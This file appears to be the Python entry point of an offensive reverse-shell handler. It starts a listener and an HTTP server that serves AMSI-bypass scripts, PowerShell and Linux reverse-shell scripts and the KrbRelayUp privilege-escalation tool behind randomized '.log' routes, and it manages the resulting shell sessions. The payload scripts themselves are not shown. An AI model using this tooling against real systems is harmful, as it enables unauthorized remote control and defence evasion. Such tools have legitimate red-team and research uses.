"""Entry point for the program"""
import sys
from time import sleep
from rich.traceback import install
from http_handler.http_server import HttpServer, HttpDeliveringServer
from req_handler.connection_handler import ConnectionHandler
from utils.minishh_utils import MinishhUtils
from utils.pwsh_utils import PwshUtils, ObfUtil
from utils.print_utils import Printer
from utils.ipaddr import IpAddr
from config.config import AppConfig, MinishhRequirements, RequirementsError
from commands.menu_command import MenuCommand
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.patch_stdout import patch_stdout

class Main:
    """
    Main is the class managing the interactive menu
    It has the configuration and some commands about sessions
    """
    def __init__(self):
        super().__init__()
        self._prompt_menu = Printer.format("[{blue}Menu{reset}] ")
        self.commands = MenuCommand(self)
        self.socket_server = None
        self.http_server = None

    def init_options(self):
        """Init extra options for the configurations"""
        ip_manager = IpAddr()
        ip_manager.init_ip()
        AppConfig.set_extra_var(
            "default_ip_address",
            ip_manager.get_default(
                AppConfig.get("default", "Interfaces")
                ),
            section="UserSection",
            force=True
            ) # Set the ip address to the default interface, and overwrite if already present

    def safe_start_server(self, server):
        """
        This function starts all server by calling common method
        It first starts the server
        Then it waits for it to finish the initialisation
        Finally, it checks if everything went well and that the server is listening
        Otherwise exit in case of failure
        """
        server.start()
        server.has_started.wait()
        if not(server.is_listening):
            Printer.err(f"{server} died, exiting...")
            self.stop_all_server()
            exit(1)

    def start_all_server(self):
        """Start the different servers of the program"""
        self.socket_server = ConnectionHandler()
        self.http_server = HttpServer()

        self.safe_start_server(self.socket_server)
        self.safe_start_server(self.http_server)

    def init_routes_for_server(self):
        """
        Init default routes for the http server
        Route for disabling amsi by patching the DLL in 2 steps are enabled by default
        and bound to the script associated

        Example:
         - amsi_bypass_script=amsi.ps1
         - AppConfig.get_and_set_if_not_exists("scripts/amsi.ps1", random_route.log, "Routes")
        """
        HttpDeliveringServer.init_permanent_route({"test": "../ADTools/KrbRelayUp.exe"})

        # Init scripts for windows and linux and create route dynamically if not already set
        all_scripts = []
        all_scripts.extend(MinishhUtils.recover_scripts("amsi_bypass_scripts", "Powershell"))
        all_scripts.extend(MinishhUtils.recover_scripts("on_before_shell", "Powershell"))
        all_scripts.extend(MinishhUtils.recover_scripts("reverse_shell_script", "Powershell", touch=True))
        all_scripts.extend(MinishhUtils.recover_scripts("all_in_one_script", "Powershell", touch=True))

        all_scripts.extend(MinishhUtils.recover_scripts("on_before_shell", "Linux"))
        all_scripts.extend(MinishhUtils.recover_scripts("reverse_shell_script", "Linux", touch=True))
        all_scripts.extend(MinishhUtils.recover_scripts("all_in_one_script", "Linux", touch=True))

        for script in all_scripts:
            route = AppConfig.get_and_set_if_not_exists(script, ObfUtil.get_random_string(15, ext='.log'), section="Routes")
            HttpDeliveringServer.add_permanent_route(route, script)

        # Init the reverse shell script each times it is launched
        self.socket_server.set_download_server(self.http_server)

    def close_all_sessions(self):
        sessions = list(self.socket_server.get_active_sessions().values())
        if len(sessions):
            Printer.log(f"Closing [red]{len(sessions)}[/red] sessions")
            for sess in sessions:
                sess.notify_close()

    def run(self):
        """Entry for the main program"""
        self.start_all_server()
        self.init_routes_for_server()

        cmd = ''
        try:
            while True:
                with patch_stdout(raw=True):
                    cmd = self.commands.session.prompt(ANSI(self._prompt_menu))

                if cmd == "exit":
                    break

                else:
                    self.commands.handle_input(cmd)

        except(KeyboardInterrupt, EOFError):
            Printer.crlf().log("Bye !")

        finally:
            self.close_all_sessions()
            self.stop_all_server()

    def stop_all_server(self):
        """Stop previously started servers"""
        if(self.socket_server.is_alive()):
            self.socket_server.stop_listening()
            self.socket_server.join()

        if(self.http_server.is_alive()):
            self.http_server.stop_listening()
            self.http_server.join()


if __name__ == '__main__':
    install(show_locals=True)

    AppConfig.init_config()

    try:
        MinishhRequirements.check_requirements()
    except RequirementsError as e:
        Printer.err(e)
        exit(1)

    if(len(sys.argv) == 2 and sys.argv[1] in ["-v", "--verbose"]):
        Printer.verbose = True

    menu = Main()
    menu.init_options()
    menu.run()
